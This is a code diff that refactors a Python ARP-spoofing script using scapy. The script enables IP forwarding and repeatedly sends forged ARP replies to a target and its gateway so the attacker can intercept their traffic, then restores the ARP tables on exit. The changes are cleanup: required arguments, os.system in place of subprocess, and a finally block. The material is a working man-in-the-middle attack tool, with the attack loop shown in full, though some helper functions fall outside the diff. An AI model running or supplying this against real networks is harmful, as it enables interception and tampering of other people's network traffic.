@@ -1,18 +1,15 @@
 #! /usr/bin/env python
 
-import subprocess
+import os
 import time
 import scapy.all as scapy
 import argparse
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-t", "--target", dest="target", help="Target IP ")
-    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP ")
-    options = parser.parse_args()
-    if not options.target:
-        parser.error("[-] Please specify a target e.g. 192.168.2.56 and gateway 192.168.2.1 , use --help for more info.")
-    return options
+    parser.add_argument("-t", "--target", dest="target", help="Target IP ", required=True)
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP ", required=True)
+    return parser.parse_args()
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -41,16 +38,18 @@ gateway_ip = args.gateway
 
 
 try:
-    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[+] Sent packets: " + str(sent_packets_count), end="")
+        sent_packets_count += 2
+        print(f"\r[+] Sent packets: {sent_packets_count}", end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
+    print("\n[-] Detected CTRL + C ...")
+finally:
+    print("Resetting ARP tables... Please wait.")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
     print("[+] ARP tables reset successfully.")
